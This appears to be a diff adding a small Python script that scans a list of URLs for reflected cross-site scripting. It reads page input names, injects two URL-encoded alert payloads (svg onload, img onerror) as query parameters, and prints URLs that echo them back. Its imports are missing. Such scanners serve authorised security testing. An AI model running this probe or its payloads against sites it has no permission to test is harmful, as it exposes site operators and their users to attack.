@@ -1,0 +1,33 @@
+def main():
+        xss=["%3Csvg%20onload%3D%28alert%29%281%29%3E","%3Cimg%20src%3D2%20onerror%3Dalert%28%221%22%29%3E"]
+        link=[]
+        def read():
+                file=sys.argv[1]
+                file1=open(file,"r")
+                readfile1=file1.readlines()
+                for i in readfile1:
+                        link.append(i)
+
+        read()
+        def find():
+                param=[]
+                for i in link:
+                    c=i.replace("\n","")
+                    p=req.get(c)
+                    if "200" in str(p):
+                        soup=bs(p.text,'html.parser')
+                        g = soup.find_all("input")
+                        for a in g:
+                            if a.get("type") != "submit":
+                                param.append(a.get("name"))
+                        for j in param:
+                            for x in xss:
+                                payload=f"{c}?{j}={x}"
+                                send=req.get(payload).text
+                                if urllib.parse.unquote(x) in send:
+                                    print(payload)
+        find()
+
+
+
+main()
